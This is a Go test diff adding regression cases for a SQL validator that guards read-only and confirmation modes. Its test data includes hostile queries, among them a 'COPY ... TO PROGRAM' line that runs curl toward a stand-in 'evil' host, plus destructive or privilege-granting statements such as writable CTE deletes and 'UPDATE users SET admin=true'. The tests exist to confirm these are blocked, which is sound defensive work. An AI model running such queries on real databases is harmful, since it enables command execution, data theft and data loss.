@@ -196,6 +196,70 @@ func TestValidateSQLStatement_MinimalMode(t *testing.T) {
 	}
 }
 
+// TestValidateSQLStatement_BypassRegression covers statement-classification bypasses
+// that previously let writes through the read-only and confirmation gates.
+func TestValidateSQLStatement_BypassRegression(t *testing.T) {
+	cases := []struct {
+		name      string
+		query     string
+		expectErr bool
+	}{
+		{"writable CTE blocked in read-only", "WITH d AS (DELETE FROM users RETURNING *) SELECT count(*) FROM d", true},
+		{"read-only CTE allowed", "WITH d AS (SELECT id FROM users) SELECT count(*) FROM d", false},
+		{"tab-separated DROP blocked", "DROP\tTABLE users", true},
+		{"newline-separated DROP blocked", "DROP\nTABLE users", true},
+		{"COPY blocked in read-only", "COPY (SELECT 1) TO PROGRAM 'curl http://evil'", true},
+		{"DO block blocked in read-only", "DO $$ BEGIN DELETE FROM users; END $$", true},
+		{"MERGE blocked in read-only", "MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN DELETE", true},
+		{"CALL blocked in read-only", "CALL do_something()", true},
+		{"GRANT blocked in read-only", "GRANT ALL ON users TO bob", true},
+		{"EXPLAIN ANALYZE write blocked", "EXPLAIN ANALYZE UPDATE users SET admin=true", true},
+		{"plain EXPLAIN write allowed", "EXPLAIN UPDATE users SET admin=true", false},
+		{"identifier containing keyword allowed", "SELECT backdrop FROM stages", false},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			// allowMultiStatement=true isolates the classification logic from the
+			// separate multi-statement guard (DO blocks legitimately contain ';').
+			err := ValidateSQLStatement(tc.query, false, SecurityLevelStandard, true, false)
+			if tc.expectErr && err == nil {
+				t.Errorf("expected error for query %q, got nil", tc.query)
+			}
+			if !tc.expectErr && err != nil {
+				t.Errorf("unexpected error for query %q: %v", tc.query, err)
+			}
+		})
+	}
+}
+
+// TestIsSafeReadOnly verifies the predicate used by the confirmation and explain gates.
+func TestIsSafeReadOnly(t *testing.T) {
+	safe := []string{
+		"SELECT * FROM users",
+		"WITH d AS (SELECT 1) SELECT * FROM d",
+		"EXPLAIN SELECT * FROM users",
+		"EXPLAIN ANALYZE SELECT * FROM users",
+	}
+	unsafe := []string{
+		"WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d",
+		"EXPLAIN ANALYZE INSERT INTO users VALUES (1)",
+		"COPY (SELECT 1) TO PROGRAM 'x'",
+		"DROP\tTABLE users",
+		"MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN DELETE",
+	}
+	for _, q := range safe {
+		if !isSafeReadOnly(q) {
+			t.Errorf("expected %q to be safe read-only", q)
+		}
+	}
+	for _, q := range unsafe {
+		if isSafeReadOnly(q) {
+			t.Errorf("expected %q to NOT be safe read-only", q)
+		}
+	}
+}
+
 func TestValidateSQLStatement_Comments(t *testing.T) {
 	cases := []struct {
 		name      string
